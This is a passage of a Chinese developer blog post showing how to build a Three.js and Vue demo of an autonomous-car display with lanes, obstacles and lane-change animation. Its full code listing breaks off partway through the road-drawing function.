                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>之前接到一个需求，说是给某个无人车做个啥配套的演示代码，但是仅仅只是提供一个Demo，所以细节上很多地方并没有深究。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7112cb42579e4b0894d518b1b2309240~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5YmR5LiA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904828&amp;x-signature=AttdCqs5lTzXxaC7GQikD4L2MSc%3D" alt="无标题视频——使用Clipchamp制作.gif" loading="lazy"/></p>
<p>不过虽然仅仅是一个Demo，但是其核心的功能基本都实现了：</p>
<ul>
<li>道路生成</li>
<li>道路上障碍物生成（包括固定障碍物、车辆等）</li>
<li>车辆行进效果展示</li>
<li>避障道路切换展示</li>
</ul>
<h2 data-id="heading-0">实现方案</h2>
<p>使用Three.js实现3D车机大屏效果，先安装 <code>Three.js</code></p>
<pre><code class="hljs language-bash" lang="bash">pnpm install three
</code></pre>
<p>我这里使用的版本是 <code>v0.150.1</code>。</p>
<h3 data-id="heading-1">初始化场景</h3>
<p>通过 <code>THREE.Scene()</code> 对象生成简单的背景，以及环境光部分。</p>
<p>注意：环境光如果没有特殊的需求用默认的也没问题。</p>
<pre><code class="hljs language-js" lang="js">scene = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Scene</span>()
scene.<span class="hljs-property">background</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Color</span>(<span class="hljs-number">0xE8E8E8</span>)

<span class="hljs-comment">// 添加环境光</span>
<span class="hljs-comment">// const ambientLight = new THREE.AmbientLight(0xffffff, 0.8)</span>
<span class="hljs-comment">// scene.add(ambientLight)</span>
</code></pre>
<p>初始化部分直接创建渲染器：</p>
<pre><code class="hljs language-js" lang="js">renderer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">WebGLRenderer</span>({ <span class="hljs-attr">antialias</span>: <span class="hljs-literal">true</span> })
renderer.<span class="hljs-title function_">setSize</span>(rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-property">clientWidth</span>, rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-property">clientHeight</span>)
renderer.<span class="hljs-title function_">setPixelRatio</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">devicePixelRatio</span>)
renderer.<span class="hljs-property">shadowMap</span>.<span class="hljs-property">enabled</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">// 避免proxy错误</span>
rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-title function_">appendChild</span>(renderer.<span class="hljs-property">domElement</span>)
</code></pre>
<h3 data-id="heading-2">创建道路</h3>
<p>通过 <code>THREE.PlaneGeometry</code> 对象创建道路，这里我是直接写死的，因为不牵扯屏幕适配问题。</p>
<pre><code class="hljs language-js" lang="js"> <span class="hljs-keyword">const</span> roadGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PlaneGeometry</span>(<span class="hljs-number">24</span>, <span class="hljs-number">200</span>)  <span class="hljs-comment">// 参数分别是 width / height</span>
<span class="hljs-keyword">const</span> roadMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x555555</span> })
road = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(roadGeometry, roadMaterial)
road.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> = -<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">2</span>
scene.<span class="hljs-title function_">add</span>(road)
</code></pre>
<p>增加车道标线，这里我不是分开创建的，而是统一创建完以后再划分。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> lineGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PlaneGeometry</span>(<span class="hljs-number">0.15</span>, <span class="hljs-number">2</span>)
<span class="hljs-keyword">const</span> lanePositions = [-<span class="hljs-number">8</span>, -<span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>] <span class="hljs-comment">// 5条车道分隔线，形成6个车道</span>
lanePositions.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = -<span class="hljs-number">50</span>; i &lt; <span class="hljs-number">50</span>; i += <span class="hljs-number">4</span>) { <span class="hljs-comment">// 虚线间隔</span>
        <span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(lineGeometry, dashedLineMaterial)
        line.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(x, <span class="hljs-number">0.01</span>, i)
        line.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> = -<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">2</span>
        scene.<span class="hljs-title function_">add</span>(line)
    }
})
</code></pre>
<h3 data-id="heading-3">创建车辆</h3>
<p>这里需要注意，一般来说更建议使用具体的车辆模型进行展示，效果更好。</p>
<p>这里因为我确实是没找到合适的车辆模型，就简单画了一个。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> carGroup = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Group</span>()
<span class="hljs-comment">// 车身</span>
<span class="hljs-keyword">const</span> bodyGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>)
<span class="hljs-comment">// ... </span>
carGroup.<span class="hljs-title function_">add</span>(body)
<span class="hljs-comment">// 车窗</span>
<span class="hljs-keyword">const</span> windowGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(<span class="hljs-number">1.8</span>, <span class="hljs-number">0.8</span>, <span class="hljs-number">2</span>)
<span class="hljs-comment">// ... </span>
carGroup.<span class="hljs-title function_">add</span>(<span class="hljs-variable language_">window</span>)
<span class="hljs-comment">// 车轮</span>
<span class="hljs-keyword">const</span> wheelGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">CylinderGeometry</span>(<span class="hljs-number">0.3</span>, <span class="hljs-number">0.3</span>, <span class="hljs-number">0.2</span>, <span class="hljs-number">16</span>)
<span class="hljs-comment">// ... </span>
carGroup.<span class="hljs-title function_">add</span>(wheel)
<span class="hljs-comment">// 将车辆添加到画布</span>
scene.<span class="hljs-title function_">add</span>(carGroup)
</code></pre>
<p>这里需要注意，主体车辆行驶过程中需要增加跟随。</p>
<pre><code class="hljs language-js" lang="js">camera = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PerspectiveCamera</span>(<span class="hljs-number">75</span>, rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-property">clientWidth</span> / rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-property">clientHeight</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">1000</span>)
<span class="hljs-comment">// 第三人称跟随视角</span>
camera.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, -<span class="hljs-number">15</span>)
camera.<span class="hljs-title function_">lookAt</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
</code></pre>
<h3 data-id="heading-4">创建障碍物</h3>
<p>基本与创建车辆类似，但是是随机在车道上进行创建障碍物。</p>
<p>另外如果是车辆的话增加一个行驶速度。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obstacle = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Group</span>()
    
<span class="hljs-comment">// 主体</span>
<span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(type.<span class="hljs-property">size</span>.<span class="hljs-property">w</span>, type.<span class="hljs-property">size</span>.<span class="hljs-property">h</span>, type.<span class="hljs-property">size</span>.<span class="hljs-property">d</span>)
<span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: type.<span class="hljs-property">color</span> })
<span class="hljs-keyword">const</span> body = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(geometry, material)
obstacle.<span class="hljs-title function_">add</span>(body)

<span class="hljs-comment">// 随机位置（6车道系统，增加间距）</span>
<span class="hljs-keyword">const</span> lanes = [-<span class="hljs-number">10</span>, -<span class="hljs-number">6</span>, -<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>] <span class="hljs-comment">// 6个车道的中心位置</span>
<span class="hljs-keyword">const</span> lane = lanes[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * lanes.<span class="hljs-property">length</span>)]
obstacle.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(lane, <span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">60</span> + <span class="hljs-number">20</span>) <span class="hljs-comment">// 增加生成距离</span>

<span class="hljs-comment">// 添加移动速度</span>
obstacle.<span class="hljs-property">userData</span> = {
    <span class="hljs-attr">speed</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">0.02</span> + <span class="hljs-number">0.01</span>,
    <span class="hljs-attr">type</span>: type.<span class="hljs-property">type</span>
}
</code></pre>
<h3 data-id="heading-5">障碍物检测 &amp; 寻找安全车道</h3>
<p>障碍物的检测和寻找安全车道效果基本上相同，都是在前后距离范围内检测是否存在障碍物，如果存在那么就认定障碍物检测成功。</p>
<p>如果当前车道存在，而其他车道不存在，则认定其他车道为安全车道。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 检查是否在同一车道且在前方</span>
<span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(obstacleX - carX) &lt; <span class="hljs-number">1.5</span> &amp;&amp; <span class="hljs-comment">// 同一车道范围</span>
    obstacleZ &gt; carZ &amp;&amp; <span class="hljs-comment">// 在前方</span>
    obstacleZ - carZ &lt; detectionDistance) { <span class="hljs-comment">// 在检测距离内</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
}
</code></pre>
<h3 data-id="heading-6">车道变换效果</h3>
<p>这里需要注意，变换车道效果0.5s即完成，尤其是提示部分。</p>
<p>如果是实际项目此处应该配合真正的传感器和计算完成时间计算。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> deltaX = targetX - currentX
<span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(deltaX) &gt; <span class="hljs-number">0.1</span>) {
    car.<span class="hljs-property">position</span>.<span class="hljs-property">x</span> += <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sign</span>(deltaX) * laneChangeSpeed
} <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 变道完成</span>
    car.<span class="hljs-property">position</span>.<span class="hljs-property">x</span> = targetX
    currentLane = targetLane
    
    <span class="hljs-comment">// 0.5秒后重置状态</span>
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-keyword">if</span> (!isChangingLane) {
            laneChangeStatus.<span class="hljs-property">value</span> = <span class="hljs-string">'正常行驶'</span>
        }
    }, <span class="hljs-number">500</span>)
}
</code></pre>
<p>其他部分就没什么了，主要是运行过程中需要循环进行变道、道路标线的更新、障碍物的更新。</p>
<p>当然，我推荐你在卸载页面的时候释放掉资源。不释放也没啥太大影响倒是。</p>
<h2 data-id="heading-7">全部代码</h2>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"car-three"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"rendererCanvas"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"controls"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"speed-info"</span>&gt;</span>速度: {{ speed.toFixed(1) }} km/h<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"obstacle-count"</span>&gt;</span>障碍物数量: {{ obstacleCount }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"lane-info"</span>&gt;</span>当前车道: {{ currentLaneDisplay }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"lane-change-status"</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"{ active: isChangingLaneDisplay }"</span>&gt;</span>
                {{ laneChangeStatus }}
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-variable constant_">THREE</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'three'</span>;
<span class="hljs-keyword">import</span> { ref, onMounted, onBeforeUnmount } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> rendererCanvas = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
<span class="hljs-keyword">const</span> speed = <span class="hljs-title function_">ref</span>(<span class="hljs-number">60</span>) <span class="hljs-comment">// 车速 km/h</span>
<span class="hljs-keyword">const</span> obstacleCount = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
<span class="hljs-keyword">const</span> currentLaneDisplay = <span class="hljs-title function_">ref</span>(<span class="hljs-number">3</span>) <span class="hljs-comment">// 显示用的车道号（1-6）</span>
<span class="hljs-keyword">const</span> isChangingLaneDisplay = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)
<span class="hljs-keyword">const</span> laneChangeStatus = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'正常行驶'</span>)

<span class="hljs-keyword">let</span> scene, camera, renderer
<span class="hljs-keyword">let</span> car, road, obstacles = []
<span class="hljs-keyword">let</span> clock = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Clock</span>()

<span class="hljs-comment">// 车辆控制</span>
<span class="hljs-keyword">let</span> carSpeed = <span class="hljs-number">0.05</span>
<span class="hljs-keyword">let</span> roadOffset = <span class="hljs-number">0</span>
<span class="hljs-keyword">let</span> currentLane = <span class="hljs-number">2</span> <span class="hljs-comment">// 当前车道索引（0-5对应6个车道）</span>
<span class="hljs-keyword">let</span> targetLane = <span class="hljs-number">2</span> <span class="hljs-comment">// 目标车道索引</span>
<span class="hljs-keyword">let</span> isChangingLane = <span class="hljs-literal">false</span> <span class="hljs-comment">// 是否正在变道</span>
<span class="hljs-keyword">let</span> laneChangeSpeed = <span class="hljs-number">0.02</span> <span class="hljs-comment">// 变道速度</span>

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">initScene</span>()
    <span class="hljs-title function_">createRoad</span>()
    <span class="hljs-title function_">createCar</span>()
    <span class="hljs-title function_">createObstacles</span>()
    <span class="hljs-title function_">setupCamera</span>()
    <span class="hljs-title function_">animate</span>()
})

<span class="hljs-keyword">const</span> <span class="hljs-title function_">initScene</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// 初始化场景</span>
    scene = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Scene</span>()
    scene.<span class="hljs-property">background</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Color</span>(<span class="hljs-number">0xE8E8E8</span>) <span class="hljs-comment">// 灰白色背景</span>
    
    <span class="hljs-comment">// 创建渲染器</span>
    renderer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">WebGLRenderer</span>({ <span class="hljs-attr">antialias</span>: <span class="hljs-literal">true</span> })
    renderer.<span class="hljs-title function_">setSize</span>(rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-property">clientWidth</span>, rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-property">clientHeight</span>)
    renderer.<span class="hljs-title function_">setPixelRatio</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">devicePixelRatio</span>)
    renderer.<span class="hljs-property">shadowMap</span>.<span class="hljs-property">enabled</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">// 避免proxy错误</span>
    rendererCanvas.<span class="hljs-property">value</span>.<span class="hljs-title function_">appendChild</span>(renderer.<span class="hljs-property">domElement</span>)
    
    <span class="hljs-comment">// 添加环境光</span>
    <span class="hljs-comment">// const ambientLight = new THREE.AmbientLight(0xffffff, 0.8)</span>
    <span class="hljs-comment">// scene.add(ambientLight)</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">createRoad</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// 创建道路（6车道）</span>
    <span class="hljs-keyword">const</span> roadGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PlaneGeometry</span>(<span class="hljs-number">24</span>, <span class="hljs-number">200</span>)
    <span class="hljs-keyword">const</span> roadMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x555555</span> })
    road = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(roadGeometry, roadMaterial)
    road.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> = -<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">2</span>
    scene.<span class="hljs-title function_">add</span>(road)
    
    <span class="hljs-comment">// 创建车道标线</span>
    <span class="hljs-keyword">const</span> lineGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PlaneGeometry</span>(<span class="hljs-number">0.15</span>, <span class="hljs-number">2</span>)
    <span class="hljs-keyword">const</span> lineMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0xffffff</span> })
    <span class="hljs-keyword">const</span> dashedLineMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0xffffff</span> })
    
    <span class="hljs-comment">// 车道分隔线（虚线）- 创建多个短线段</span>
    <span class="hljs-keyword">const</span> lanePositions = [-<span class="hljs-number">8</span>, -<span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>] <span class="hljs-comment">// 5条车道分隔线，形成6个车道</span>
    
    lanePositions.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> {
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = -<span class="hljs-number">50</span>; i &lt; <span class="hljs-number">50</span>; i += <span class="hljs-number">4</span>) { <span class="hljs-comment">// 虚线间隔</span>
            <span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(lineGeometry, dashedLineMaterial)
            line.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(x, <span class="hljs-number">0.01</span>, i)
            line.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> = -<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">2</span>
            scene.<span class="hljs-title function_">add</span>(line)
        }
    })
    
    <span class="hljs-comment">// 道路边界线（实线）</span>
    <span class="hljs-keyword">const</span> borderGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PlaneGeometry</span>(<span class="hljs-number">0.2</span>, <span class="hljs-number">200</span>)
    <span class="hljs-keyword">const</span> leftBorder = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(borderGeometry, lineMaterial)
    leftBorder.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(-<span class="hljs-number">12</span>, <span class="hljs-number">0.01</span>, <span class="hljs-number">0</span>)
    leftBorder.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> = -<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">2</span>
    scene.<span class="hljs-title function_">add</span>(leftBorder)
    
